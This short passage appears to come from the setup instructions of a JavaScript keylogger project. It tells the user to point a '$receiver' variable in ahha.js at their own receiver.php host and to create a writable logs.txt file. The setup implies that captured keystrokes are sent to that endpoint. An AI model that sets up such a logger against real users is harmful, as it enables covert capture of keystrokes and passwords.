1. edit ahha.js, change this line to your receiver.php 

mine:
```javascript
var $receiver = "http://localhost/playground/testkeylog/receiver.php";
```

yours:
```javascript
var $receiver = "http://yourhost/testkeylog/receiver.php";
```

create logs.txt in testkeylog folder and make sure it is writable, if necessary.
